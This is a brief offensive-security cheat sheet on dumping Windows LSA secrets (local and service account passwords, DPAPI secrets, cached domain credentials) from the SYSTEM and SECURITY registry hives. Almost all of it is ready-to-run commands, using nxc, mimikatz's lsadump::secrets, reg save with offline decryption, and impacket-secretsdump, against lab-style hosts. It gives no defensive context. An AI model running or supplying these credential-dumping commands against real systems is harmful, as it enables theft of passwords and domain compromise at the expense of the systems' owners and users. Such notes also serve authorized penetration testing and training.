#creds
dumping Local Security Authority that are Stored in the **registry** 
Registry path:  
`HKLM\SYSTEM` and `HKLM\SECURITY`
and has **Local passwords**, **service account passwords**, **DPAPI secrets**, **cached domain credentials**.

---
### using nxc:
```bash
nxc smb SRV01.GOTHAM.CITY -u pix3l -p P@ssw0rd --local-auth --lsa
```

### using mimkatz:
```powershell
token::elevate
lsadump::secrets
```

### dumping registry:
```powershell
reg save HKLM\SYSTEM system & reg save HKLM\security security

# then use mimikatz to decrypt it
lsadump::secrets /system:c:\temp\system /security:c:\temp\security
```

### using `secretdump.py`
```bash
impacket-secretsdump test.local/john:password123@10.10.10.1
```